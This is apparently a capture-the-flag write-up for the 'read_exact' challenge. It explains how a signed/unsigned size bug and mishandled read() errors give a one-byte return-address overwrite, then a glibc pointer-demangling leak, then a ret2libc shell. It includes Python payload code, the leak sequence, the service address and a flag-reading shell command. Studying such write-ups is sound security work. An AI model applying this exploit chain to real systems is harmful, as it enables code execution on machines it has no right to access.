# read_exact Writeup

## Summary

This challenge is a 64-bit non-PIE ELF with NX, full RELRO, and a stack canary. The bug is not a normal linear stack overflow. The intended path is:

1. Abuse a signed-to-unsigned conversion in `size`.
2. Use the `-8` case to corrupt `read_all()`'s return address by one byte.
3. Return into the middle of `get_size()` and get a fake `fgets()` on overlapping stack frames.
4. Build a recursive `main()` ladder without knowing any ASLR addresses.
5. Leak glibc startup state from the same process, recover `libc_base`, and use one more `-8` stage to seed a ret2libc chain.

The final flag was:

```text
tkbctf{r34d_411_y0ur_d474-598504444abf8208a4e930eff1af600cd653b7dd623e57bdf365d1bfb8ea6748}
```

The exploit script is in [solve.py](solve.py).

## Source Review

The whole challenge is basically this:

```c
size_t get_size() {
    char buf[0x40];
    fgets(buf, sizeof(buf), stdin);
    return atol(buf);
}

void read_all(char *buffer, size_t size) {
    size_t num_read = 0;
    while (num_read != size) {
        num_read += read(0, buffer + num_read, size - num_read);
    }
    buffer[size] = '\0';
}

int main() {
    size_t size = get_size();
    char buffer[size + 1];
    read_all(buffer, size);
    printf("bye! %s\n", buffer);
}
```

There are two issues:

1. `atol()` returns a signed `long`, but the result is stored into `size_t`.
2. `read_all()` does not handle `read()` errors. If `read()` returns `-1`, that value is added into `num_read`.

Negative inputs therefore become huge unsigned sizes, and `num_read` can walk backwards one byte at a time on repeated `EFAULT`s.

## Why `-8` Matters

For `size = -8`, `main()`'s VLA size wraps in a useful way:

- the stack allocation rounds to zero,
- `buffer` becomes the current `rsp`,
- `read_all(buffer, size)` is called with a valid pointer but a huge length.

`read()` immediately fails with `EFAULT`, returns `-1`, and `read_all()` keeps doing:

```c
num_read += -1;
```

After 8 failures, `num_read == size == -8`, so the loop stops and this line runs:

```c
buffer[size] = '\0';
```

That null byte lands on the low byte of `read_all()`'s saved return address:

- original return: `0x4012a1`
- overwritten return: `0x401200`

`0x401200` is in the middle of `get_size()`. Returning there skips the real prologue and executes a synthetic:

```c
fgets(fake_rbp - 0x50, 0x40, stdin);
atol(fake_rbp - 0x50);
ret;
```

The important part is that the attacker data sent after `-8\n` is not consumed by `read_all()`. It is consumed by this fake `fgets()`, and the destination overlaps the caller's stack frames.

## Stage 1: Build a Recursive `main()` Ladder

The first fake `fgets()` can be used to seed future returns to `main()` using only static binary addresses.

The stable first payload is:

```python
stage1 = b"A" * 0x10 + b"".join(p64(x) for x in [
    0,
    0x401250, 0x401250, 0x401250, 0x401250,
    0x401250, 0x401250, 0x401250,
]) + b"\n"
```

This creates a same-process loop of synthetic `main()` invocations. That matters because remote ASLR changes across connections, so the exploit has to leak and exploit inside one process.

## Stage 2: Leak glibc Startup State

The useful same-process leak sequence was:

```text
-145
-145
-177
```

What these do after the recursive setup:

- first `-145`: leaks a stack pointer equal to `saved_rsp + 0x118`
- second `-145`: advances the recursive frame into the right area
- `-177`: leaks 16 bytes from the glibc startup `_setjmp` state

On the live service, output coalescing can combine multiple `bye!` lines into one read, so the exploit must parse the **last** `bye!` body from each chunk.

## Recovering `libc_base`

The `-177` leak gives two mangled pointers:

- mangled `JB_RSP`
- mangled `JB_PC`

glibc pointer mangling is:

```text
mangled = rol(real ^ guard, 17)
```

So the reverse is:

```text
real = ror(mangled, 17) ^ guard
```

We know the real saved stack pointer from the first `-145` leak:

```python
saved_rsp = leak145 - 0x118
```

That gives the pointer guard:

```python
guard = ror(mangled_rsp, 17) ^ saved_rsp
```

Then we recover the saved PC:

```python
rip = ror(mangled_pc, 17) ^ guard
```

Inside the Ubuntu 24.04 libc used by the challenge container, that PC is the return after `_setjmp` inside `__libc_init_first`, at offset `0x2a181`, so:

```python
libc_base = rip - 0x2a181
```

This matches the container setup in [Dockerfile](_src/read-exact/Dockerfile), which is based on `ubuntu:24.04`.

## Stage 3: Seed ret2libc

With `libc_base` known, one more `-8` gives another fake `fgets()` write. The correct layout is:

- `qword 0`: fake saved `rbp`
- `qword 1`: return to `main` once more
- `qword 2`: `ret`
- `qword 3`: `pop rdi ; ret`
- `qword 4`: `"/bin/sh"`
- `qword 5`: `system`

The payload shape is:

```python
stage2 = (
    b"B" * 0x10
    + p64(0)
    + p64(MAIN)
    + p64(libc_base + RET)
    + p64(libc_base + POP_RDI)
    + p64(libc_base + BINSH)
    + p64(libc_base + SYSTEM)[:7]
    + b"\n"
)
```

The last pointer is written as 7 bytes because `fgets(..., 0x40, ...)` only gives room for 63 data bytes. On x86-64 userland addresses, the high byte is zero, so a 7-byte partial overwrite is enough.

After this final `-8`, the program prints one more:

```text
bye!
```

Then the seeded recursive `main()` unwinds into:

```text
ret
pop rdi ; ret
"/bin/sh"
system
```

At that point we already have a shell and can run:

```sh
cat /app/flag-* /flag-* 2>/dev/null
```

## End-to-End Exploit Flow

The final remote flow is:

1. Send `-8`, then the recursive `main()` ladder payload.
2. Send `-145`.
3. Send `-145`.
4. Send `-177`.
5. Demangle glibc startup pointers and compute `libc_base`.
6. Send `-8`, then the ret2libc payload.
7. Send `cat /app/flag-* /flag-* 2>/dev/null; exit`.

## Running the Solver

The solve script already automates the whole chain:

```bash
python3 ./solve.py
```

During solve, the live service was:

```text
35.194.108.145:33137
```

## Takeaways

- The core bug is not the VLA by itself, but the interaction between:
  - signed parsing via `atol`,
  - unsigned arithmetic in `size_t`,
  - and `read_all()` treating `-1` from `read()` as progress.
- `-8` is the special value because it produces a one-byte return-address null overwrite that lands on useful code.
- The challenge is mainly about turning that one-byte overwrite into a same-process leak chain and only then into code execution.
